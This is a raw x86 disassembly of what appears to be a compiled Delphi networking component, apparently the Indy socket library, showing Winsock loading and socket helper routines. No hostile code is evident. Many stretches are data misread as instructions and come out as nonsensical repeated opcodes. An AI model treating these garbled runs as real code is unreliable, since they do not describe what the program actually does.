add [ ebx + esi + 0x40 ] al
add [ eax - 0x3fffbfcd ] al
add [ esi ] 0x6449450e
push ebx
pop ebx
pop ebp
retn 0x4
jb r-xdata
mov eax 0xf8ebfff9
pop ebp
retn
outsd
jb r-xdata
outsb
jbe r-xdata
dec ecx
sub_4681c0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40bc44
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_468208
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46822d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
sub_468240
push 0xff004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax + 0x680000fe ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x680000fe ] dh
jbe r-xdata
add [ esp + eax * 4 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x7c ] bh
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax - 0x80 ] al
inc esi
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
hlt
add [ edx + 0x550000fe ] dh
mov ebp esp
xor eax eax
push ebp
push sub_468405
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46840c
retn
sub_468490
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_468530
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_404174
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b430
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_404174
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4044a0
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40bc44
mov ecx edi
xor edx edx
mov eax ebx
call sub_40bc44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468537
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404144
retn
sub_468537
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_469314
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_4693b7
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4693be
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_4092d8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_468490
call sub_403b5c
sub_4693c8
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_4693ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4694b9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_4092d8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_468490
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4694c0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_4694f7
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_469524
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46952b
retn
call sub_468568
sub_469540
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_469565
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46956c
retn
sub_469578
les edx [ ebp + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x95
inc esi
add [ eax + eax ] al
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x6fffbfcd ] al
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax - 0x63 ] dl
inc esi
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
nop
sub eax [ eax ]
sbb al 0x99
inc esi
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
dec eax
cdq
inc esi
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
or [ eax ] al
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
imul esi [ ebx + 0x74 ] 0x9630c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
arpl [ ebx - 0x70 ] bp
sbb al 0x97
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 ] bl
inc esi
add [ eax + eax ] cl
add [ eax ] al
inc eax
add [ esi ] 0xd8
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xd004033 ] al
inc ebp
dec ecx
push ebx
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xe400408d
xchg edi eax
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
xchg edi eax
inc esi
add [ eax + eax ] cl
add [ eax ] al
rcl [ esi + 0x35d80046 ] 0x1
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edi ] dl
inc ebp
dec ecx
push ebx
je r-xdata
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_469808
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x69 ] bh
inc esi
add [ eax + eax ] cl
add [ eax ] al
rcl [ esi + 0x35d80046 ] 0x1
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax * 2 + 0x74536449 ] bl
popad
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
sar [ eax - 0x69 ] 0x46
sub_469808
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4698bc
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_469850
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_4698af
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4698b6
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
sub_4698bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46990e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4681c0
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469915
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_469948
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_469d42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404120
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_4092d8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d49
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
jmp [ eax * 4 + jump_table_469988 ]
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
sub_469d50
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_469d80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_469dc8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469dcf
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_469dd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_469dfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469e04
retn
sub_469e10
pop esp
sahf
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x46 ] ch
add [ eax ] cl
add [ eax ] eax
add [ eax - 0x6b ] bh
inc esi
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x68004033 ] al
lodsd [ esi ]
inc esi
add [ eax ] al
lodsd [ esi ]
inc esi
add al dl
lodsd [ esi ]
inc esi
add [ ebp + ebp * 4 + 0x46 ] ah
add [ esp + edx * 2 ] dl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
sub [ eax - 0x56d3ffba ] ah
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
inc esi
add [ edx - 0x58fbffba ] dh
inc esi
add [ eax + ebp * 4 ] cl
inc esi
add ah ch
cmpsb [ esi ] [ edi ]
inc esi
add [ eax - 0x5d ] al
inc esi
add al bh
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + ebp * 4 ] dl
inc esi
add [ eax ] ah
test eax 0xa34c0046
inc esi
add [ eax - 0x5d ] ch
inc esi
add ah ah
movsb [ edi ] [ esi ]
inc esi
add ah bh
movsd [ edi ] [ esi ]
inc esi
add [ eax ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ esi - 0x592bffba ] al
inc esi
add [ ebx + ebp * 4 - 0x51fbffba ] dl
inc esi
add al cl
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x400046ab ] ah
lodsb [ esi ]
inc esi
add al ah
lodsb [ esi ]
inc esi
add [ eax - 0x60 ] dl
inc esi
add [ eax + 0xf0046aa ] bh
push esp
dec ecx
push ebx
je r-xdata
add al 0xa3
inc esi
add ah dl
test eax 0xa6a40046
inc esi
add [ edi + ebx * 4 + 0x46 ] ah
add [ eax ] al
mov eax [ 0xffffffffa1900046 ]
inc esi
add ah bh
mov eax [ 0xffffffffa2080046 ]
inc esi
add [ eax - 0x5e ] bl
inc esi
add [ ebx ] al
lea eax [ eax ]
rcr [ esi + 0x46 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
lahf
inc esi
add [ eax ] dl
add [ eax ] al
add ah ah
xchg ebp eax
inc esi
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax ] ch
mov al [ 0xffffffffa92c0046 ]
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46a002
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_46991c
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a009
lea eax [ ebp - 0x194 ]
call sub_404120
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_4693ec
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
sub_46a028
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_469d50
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46a050
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_46a0e4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_4085c0
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_4085c0
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_4085c0
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_4085c0
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4044a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a0eb
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
sub_46a0f7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46a17f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404174
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a186
lea eax [ ebp - 0x1c ]
call sub_404120
retn
sub_46a190
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_4043e0
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_469d80
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46a208
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_469d80
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
